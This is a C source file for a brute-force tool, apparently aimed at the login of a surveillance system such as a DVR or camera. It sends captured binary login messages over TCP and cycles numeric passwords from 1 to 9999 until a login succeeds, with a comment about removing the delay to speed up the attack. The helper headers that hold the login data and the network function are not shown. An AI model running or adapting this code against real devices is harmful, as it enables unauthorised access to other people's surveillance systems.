/******************************************************************************
*  @file tcp_brute.c
*  @brief tcp_brute: Generic Network Brute-force
*  @version 1.0.1
*  @author Ara Khachatryan 
******************************************************************************/

#include <stdio.h> 

/***************
* included files --->>
***************/
#include "repl_hex_data.h" /* function for setting password in login data */
#include "print_hex_data.h" /* function for printing login data in terminal */
#include "tcp_login.h" /* core bruteforce function: tcp_login() */
#include "loadBar.h" /* loading bar on terminal: loadBar(), loadBar_fast() */

/******************************************************************************
* @brief include all the data from hex_data.h header file that will be used in 
*        Surviliance system bruteforce
* type: static unsigned char 
* login_data_NULL[116] - login message with NULL password
* login_data_1020[116] - login message with 1020 password
* login_data_5050[116] - login message with 5050 password
* COMMAND_LOGIN_FAIL[18] - keyword send from target in case of wrong password
* admin[5] - login name within login message
******************************************************************************/
#include "hex_data.h" 


void print_hex_data( unsigned char *login_data );

int main( )
{

	int passwd = 0;
	int limit = 9999;
	

	/**********************************************************************
	* probe for false "5050" and true "1020" passwords --->>
	**********************************************************************/
	printf("\x1B[2J"); /* clear the terminal screen */
	printf("\x1B[0;0H"); /* move cursor to the 0;0 position of termial */
	print_hex_data( login_data_5050 ); 
	tcp_login( login_data_5050 ); sleep(1);
	print_hex_data( login_data_1020 );
	tcp_login( login_data_1020 ); sleep(1);


	/**********************************************************************
	* bruteforce loop --->>
	**********************************************************************/
 	for ( passwd = 1; passwd <= limit; passwd++ ) {
		
		loadBar( passwd, limit, 50 );  
		//loadBar_fast( passwd, limit, 1000, 50 ); 

		repl_hex_data( login_data_NULL, passwd );
		
		if ( tcp_login( login_data_NULL ) == 1 ) {
			break;
		}
		
		// dont forget to disable this line, it slows code
		usleep(2500);
	}


	return 0;
}

